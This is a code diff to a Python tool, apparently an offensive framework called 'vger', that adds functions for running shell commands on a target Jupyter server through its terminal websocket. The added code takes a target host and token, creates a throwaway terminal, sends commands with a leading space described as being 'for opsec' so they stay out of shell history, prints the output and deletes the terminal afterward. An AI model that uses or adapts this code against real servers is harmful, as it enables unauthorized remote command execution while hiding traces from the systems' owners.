@@ -3,6 +3,8 @@ import asyncio
 import json
 from urllib.parse import urlparse
 from websockets import connect
+import argparse
+from vger.connection import Connection
 
 async def attack_session(connection, session, code, silent=False, print_out=True, get_hist=False):
     jpy_sess = connection.jpy_sessions[session]
@@ -34,3 +36,37 @@ async def attack_session(connection, session, code, silent=False, print_out=True
             connection.con.print(code_msg)
         await conn.send(json.dumps(code_msg))
         return await recv_all(conn)
+
+async def send_to_terminal(ws, code):
+    await ws.send(json.dumps(['stdin', " " + code + '\n'])) # space for opsec
+
+async def recv_from_terminal(ws):
+    while True:
+        message = await ws.recv()
+        data = json.loads(message)
+        if len(data) > 1 and data[0] == 'stdout':
+            print(f"{data[1]}")
+    
+async def run_in_terminal(connection, terminal, code, timeout=2):
+    ws_base_url = urlparse(connection.url)._replace(scheme='ws').geturl()
+    ws_url = ws_base_url + f'terminals/websocket/{terminal}'
+    try:
+        async with connect(ws_url, extra_headers=connection.headers, close_timeout=2) as conn:
+            await send_to_terminal(conn, code)
+            await asyncio.wait_for(recv_from_terminal(conn), timeout=timeout)
+    except asyncio.TimeoutError:
+        pass
+
+async def run_ephemeral_terminal(connection, code, timeout=2):
+    new_term = connection.create_terminal()
+    await run_in_terminal(connection, new_term["name"], code, timeout)
+    connection.delete_terminal(new_term["name"])
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description="Connect to target")
+    parser.add_argument("socket", type=str, help="Target socket as http://host:port/")
+    parser.add_argument("secret", type=str, help="Token or password")
+    args = parser.parse_args()
+    c = Connection(args.socket, args.secret)
+    loop = asyncio.new_event_loop()
+    loop.run_until_complete(run_ephemeral_terminal(c, "ls"))
